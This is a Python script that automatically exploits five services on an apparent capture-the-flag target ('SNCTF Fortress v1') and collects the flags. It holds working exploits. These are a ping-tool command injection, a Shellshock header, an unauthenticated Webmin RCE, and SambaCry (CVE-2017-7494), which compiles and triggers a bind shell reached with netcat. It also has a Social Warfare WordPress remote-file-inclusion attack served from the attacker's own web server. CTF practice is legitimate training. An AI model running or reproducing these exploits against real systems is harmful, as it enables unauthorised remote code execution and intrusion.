#!/usr/bin/sudo python3
"""My fortress_hax.py will crush version 1 of the SNCTF fortress"""
from argparse import ArgumentParser
from os import system
from re import search
from subprocess import DEVNULL, STDOUT, check_call, check_output
import sys
import time
from requests import get, post
import animation


wheel = ('-', '/', '|', '\\', '*')


def get_args():
    """"Get needed args."""
    parser = ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface',
                        help='interface connected to target network e.g. eth0',
                        required=True)
    parser.add_argument('-t', '--target_ip', dest='target',
                        help='target ip, IF IP IS NOT 10.2.2.150 - warfare '
                             'exploit will not work', required=True)
    feed_me = parser.parse_args()
    return feed_me


def webapp101(target):
    """Exploit simple stuff."""
    # check the web page, it is vulnerable to a simple ';' for an additional
    # command
    flag = check_output("curl -s 'http://{}:81/ping-tool.php?ip=;cat "
                        "/flag.txt'".format(target),
                        shell=True)
    flag = str(flag)
    yeah = search(r'SNCTF-{.*}', flag)
    if yeah:
        flag = '[+] WebApp101-flag: ' + yeah.group(0) + '\n'
        flag_file = open('flags.txt', 'w')
        flag_file.write(flag)
        flag_file.close()


def webapp102(target):
    """Exploit shell_shock vulnerability in cgi-bin."""
    # the symbol on the page gives it away, just search it and boom
    header = 'custom: () { :; }; echo Content-Type: text/html; echo; ' + \
             '/bin/cat /flag.txt'
    flag = check_output('curl -s {}:8080/cgi-bin/binary -H '
                        '"{}"'.format(target, header), shell=True)
    flag = str(flag)
    yeah = search(r'SNCTF-{.*}', flag)
    if yeah:
        flag = '[+] WebApp102-flag: ' + yeah.group(0) + '\n'
        flag_file = open('flags.txt', 'a')
        flag_file.write(flag)
        flag_file.close()


def big_keep(target):
    """Exploit webmin without authentication."""
    # https://www.exploit-db.com/exploits/47230, used metasploit httptrace=True
    # to figure out exactly what i needed
    url = 'http://{}:10000/password_change.cgi'.format(target)
    headers = {'Referer': 'http://{}:10000/session_login.cgi'.format(target),
               'Cookie': 'redirect=1; testing=1; sid=x',
               'Content-Type': 'application/x-www-form-urlencoded',
               }
    load = 'user=a&pam=&expired=2&old=test|/bin/cat /flag.txt&new1=test1&' + \
           'new2=test1'
    response = post(url, data=load, headers=headers)
    yeah = search(r'SNCTF-{.*}', response.text)
    if yeah:
        flag = '[+] BigKeep---flag: ' + yeah.group(0) + '\n'
        flag_file = open('flags.txt', 'a')
        flag_file.write(flag)
        flag_file.close()


def get_ip(interface):
    """Gets ip on specified interface."""
    # useful from here on
    raw_ip = check_output('ip a s | grep {}'.format(interface), shell=True)
    raw_ip = str(raw_ip)
    found_ip = search(r'\d+\.\d+\.\d+\.\d+', raw_ip)
    return found_ip.group(0)


@animation.wait(wheel, 'Exploiting stuff, hold on!-------------')
def marley(target):
    """Exploits sambacry vulnerability in the Fortressv1."""
    # omg, this was the biggest pain, don't assume anything! and back up your
    # code ;)
    def create_dot_so():
        """Creates files and compiles executable."""
        # creates an executable bind.so, a bind shell that listens on port 1337
        # mentioned in the description of the challenge
        check_call(['git', 'clone',
                    'https://github.com/opsxcq/exploit-CVE-2017-7494.git'],
                   stdout=DEVNULL, stderr=STDOUT)
        check_call(['sed', '-i', 's/6699/1337/g',
                    'exploit-CVE-2017-7494/bindshell-samba.c'],
                   stdout=DEVNULL, stderr=STDOUT)
        check_call(['gcc', '-c', '-fpic',
                    'exploit-CVE-2017-7494/bindshell-samba.c'],
                   stdout=DEVNULL, stderr=STDOUT)
        check_call(['gcc', '-shared', '-o', 'bind.so', 'bindshell-samba.o'],
                   stdout=DEVNULL, stderr=STDOUT)

    def load_dot_so(target):
        """Loads bind.so to writeable share and triggers it like hell."""
        # installs patched impacket and other libraries in python2.7 and
        # triggers the bind.so
        system('cp bind.so exploit-CVE-2017-7494/')
        check_call(['pip', 'install', '-r',
                    'exploit-CVE-2017-7494/requirements.txt'],
                   stdout=DEVNULL, stderr=STDOUT)
        check_call(['./exploit-CVE-2017-7494/exploit.py', '-t',
                    '{}'.format(target), '-e', 'bind.so', '-s', 'data', '-r',
                    '/data/bind.so', '-u', 'sambacry', '-p',
                    'nosambanocry'], stdout=DEVNULL, stderr=STDOUT)

    def netcat_port_1337(target):
        """Connects to port 1337 with netcat library."""
        # uses the bind shell from exploit to grab flag, of course you may want
        # to do other stuff
        system('echo "cat /flag.txt" | nc -q 1 {}'.format(target) + ' 1337 >> '
               + 'flags.txt 2>&1')

    create_dot_so()
    load_dot_so(target)
    time.sleep(3)  # sometimes magic helps
    netcat_port_1337(target)


@animation.wait(wheel, 'Just a bit longer!--------------------')
def warfare(target, where_am_i):
    """Exploits one of Wordpress' plugin Warfare's vulnerabilities."""
    # some wordpress plugins are safer than others
    def payload():
        """Make a naughty file for upload to warfare."""
        # creates the file that fools warfare
        file = open('payload.txt', 'w')
        file.write('<pre>system("cat /flag.txt")</pre>')
        file.close()

    def serve():
        """Starts apache, you created payload.txt not payload.php, hey it
        works."""
        # this is the main reason it runs from sudo, if you are serving .php
        # files for upload you should use python3 or twistd! NOT APACHE
        system('cp payload.txt /var/www/html/')
        system('service apache2 start')

    def exploit(target, where_am_i):
        """The actual exploit."""
        # if you have trouble getting your ip right, i use a lan segment with a
        # virtual router, check out pfsense and gain control over your lab
        if target != '10.2.2.150':
            print('Warfare exploit requires a Victim IP of 10.2.2.150, looks'
                  ' like you got some networking to do!')
        else:
            uri = 'http://{}:82/wp-admin/admin-post.php?swp_debug=' \
                  'load_options' \
                  '&swp_url='.format(target) + \
                  'http://{}/payload.txt'.format(where_am_i)
            get_response = get(uri)
            if get_response.status_code == 500:
                response = get_response.text
                raw_flag = search(r'SNCTF-{.*}', response)
                str_flag = str(raw_flag.group(0))
                flag = '[+] Warfare---flag: ' + str_flag
                flag_file = open('flags.txt', 'a')
                flag_file.write(flag)
                flag_file.close()

    def stop_serving():
        """Closes apache after removing created files."""
        # always be tidy
        system('rm payload.txt')
        system('rm /var/www/html/payload.txt')
        system('service apache2 stop')

    payload()
    serve()
    exploit(target, where_am_i)
    stop_serving()


def print_all_flags():
    """Does the reporting."""
    # if you notice all the exploits print to flags.txt
    flag_file = open('flags.txt', 'r')
    print(flag_file.readline())
    print(flag_file.readline())
    print(flag_file.readline())
    print('[+] Marley----flag: ' + flag_file.readline())  # ok, like i'm not
    # great at formatting
    print(flag_file.readline())
    flag_file.close()


def clean_up():
    """Your mom does not work here."""
    system('rm -r exploit-CVE-2017-7494/')
    system('rm bind.so')
    system('rm bindshell-samba.o')
    system('rm flags.txt')


if __name__ == '__main__':
    ARGUMENTS = get_args()
    VICTIM = ARGUMENTS.target
    webapp101(VICTIM)
    webapp102(VICTIM)
    big_keep(VICTIM)
    IP4 = get_ip(ARGUMENTS.interface)
    marley(VICTIM)
    warfare(VICTIM, IP4)
    print_all_flags()
    clean_up()
    sys.exit(0)
